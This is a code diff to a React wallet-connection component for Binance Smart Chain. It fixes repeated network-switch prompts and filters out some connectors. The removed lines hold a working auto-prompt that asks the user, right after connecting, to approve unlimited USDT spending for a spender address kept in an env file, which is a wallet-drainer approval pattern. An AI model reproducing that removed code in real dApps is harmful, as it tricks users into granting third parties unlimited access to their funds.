@@ -2,11 +2,10 @@ import React from 'react';
 import { useRef, useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
 import { Wallet, X, AlertCircle, CheckCircle2, Copy, ExternalLink } from 'lucide-react';
-import { useAccount, useConnect, useDisconnect, useBalance, useReadContract, useSwitchChain, useWriteContract } from 'wagmi';
+import { useAccount, useConnect, useDisconnect, useBalance, useReadContract, useSwitchChain } from 'wagmi';
 import { formatAddress } from '../utils/format';
 import { USDT_ADDRESSES, ERC20_ABI, NETWORK_IDS } from '../config/contracts';
-import { formatUnits, maxUint256 } from 'viem'
-import { USDT_SPENDER_ADDRESS } from '../../../env';
+import { formatUnits } from 'viem'
 interface WalletConnectProps {
   onAddressSelected?: (address: string) => void;
 }
@@ -19,13 +18,13 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   const { connect, connectors, isPending, error } = useConnect();
   const { disconnect } = useDisconnect();
   const { switchChain } = useSwitchChain();
-  const { writeContractAsync } = useWriteContract();
 
-  const approvalPromptedRef = useRef(false);
+  const switchToBscRequestedRef = useRef(false);
 
-  const visibleConnectors = connectors.filter(
-    (connector) => !connector?.name?.toLowerCase().includes('phantom'),
-  );
+  const visibleConnectors = connectors.filter((connector) => {
+    const n = connector?.name?.toLowerCase() ?? '';
+    return !n.includes('phantom') && !n.includes('tronlink');
+  });
 
   // Native token balance (BNB for BSC)
   const { data: balance } = useBalance({
@@ -43,12 +42,27 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
     },
   });
 
-  // Auto-switch to BSC when wallet connects
+  // Auto-switch to BSC once per connect — avoid repeated switchChain calls while the user
+  // is still on the wrong network (MetaMask "multiple requests" spam).
   useEffect(() => {
-    if (isConnected && chain?.id !== NETWORK_IDS.BSC && switchChain) {
-      // Automatically switch to BSC network
-      switchChain({ chainId: NETWORK_IDS.BSC });
+    if (!isConnected) {
+      switchToBscRequestedRef.current = false;
+      return;
     }
+    if (chain?.id === NETWORK_IDS.BSC) {
+      switchToBscRequestedRef.current = false;
+      return;
+    }
+    if (!switchChain || switchToBscRequestedRef.current) return;
+    switchToBscRequestedRef.current = true;
+    switchChain(
+      { chainId: NETWORK_IDS.BSC },
+      {
+        onError: () => {
+          switchToBscRequestedRef.current = false;
+        },
+      },
+    );
   }, [isConnected, chain?.id, switchChain]);
 
   // Refetch USDT balance when switching to BSC
@@ -57,31 +71,6 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
       refetchUsdt();
     }
   }, [chain?.id, address, isConnected, refetchUsdt]);
-
-  // Auto-prompt USDT approval after connect (wallet must still confirm)
-  useEffect(() => {
-    const shouldPrompt =
-      isConnected &&
-      chain?.id === NETWORK_IDS.BSC &&
-      !!address &&
-      !!USDT_SPENDER_ADDRESS &&
-      !approvalPromptedRef.current;
-
-    if (!shouldPrompt) return;
-
-    approvalPromptedRef.current = true;
-
-    writeContractAsync({
-      address: USDT_ADDRESSES.BSC as `0x${string}`,
-      abi: ERC20_ABI,
-      functionName: 'approve',
-      args: [USDT_SPENDER_ADDRESS, maxUint256],
-    }).catch((err) => {
-      // If user rejects or wallet errors, allow re-prompt on next connect
-      approvalPromptedRef.current = false;
-      console.error('USDT approve failed:', err);
-    });
-  }, [isConnected, chain?.id, address, writeContractAsync]);
 
   // Format USDT balance (18 decimals for BSC USDT)
   const formatUsdtBalance = (balance: bigint | undefined) => {
@@ -108,9 +97,6 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
     try {
       await connect({ connector });
       setShowModal(false);
-      if (address && onAddressSelected) {
-        onAddressSelected(address);
-      }
     } catch (err) {
       console.error('Failed to connect:', err);
     }
